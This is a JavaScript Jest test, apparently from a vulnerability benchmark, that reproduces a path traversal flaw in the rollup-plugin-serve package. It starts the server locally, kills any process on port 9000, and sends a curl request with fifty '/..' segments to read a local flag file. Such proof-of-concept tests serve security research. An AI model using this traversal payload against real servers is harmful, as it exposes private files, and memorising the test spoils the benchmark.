const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v18 = '/..'.repeat(50);
    const v19 = v18 + pathToFlag;
    return v19;
};
const v33 = done => {
    const v20 = expect.assertions(1);
    v20;
    const server = require('rollup-plugin-serve');
    const fs = require('fs');
    const v21 = require('child_process');
    const exec = v21.exec;
    const v22 = fs.readFileSync(pathToFlag);
    let hostsFile = v22.toString();
    const a = require('child_process');
    try {
        const v23 = () => {
        };
        const v24 = a.execSync('fuser -k 9000/tcp', v23);
        v24;
    } catch (e) {
    }
    const v25 = {
        host: 'localhost',
        port: 9000
    };
    const v26 = server(v25);
    v26;
    const v27 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:9000${ v27 }"`;
    const v31 = (error, stdout) => {
        const v28 = expect(stdout);
        const v29 = v28.toBe(hostsFile);
        v29;
        const v30 = done();
        v30;
    };
    const v32 = exec(attack_string, v31);
    v32;
};
const v34 = test('Path Traversal in  rollup-plugin-serve-favicon', v33);
v34;